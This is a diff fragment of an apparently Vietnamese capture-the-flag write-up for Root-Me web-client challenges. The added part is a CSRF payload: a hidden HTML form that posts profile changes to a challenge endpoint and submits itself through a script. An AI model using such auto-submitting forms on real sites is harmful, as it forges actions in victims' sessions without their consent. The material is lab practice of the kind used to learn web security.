@@ -53,5 +53,27 @@ document.write(String.fromCharCode(72,69,76,76,79) );//HELLO
 ở bài này , chỉ cần thay vào là ra pass thôi :D! 
 
 <img src="http://image.prntscr.com/image/fd226593f9c345f183bf3ec77361f3ab.png">
+$ csrf
+```
 
+<form name="csrf" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
+
+<label>Username:</label>
+		
+		<input type="hidden" name="username" value="b">
+	
+		<br>		
+		<div class="form-group">
+		<label>Status:</label>
+		<input type="hidden" name="status" value="on" >
+
+
+
+
+</from>
+
+<script>document.forms["csrf"].submit()</script>// auto submit
+
+
+```
 
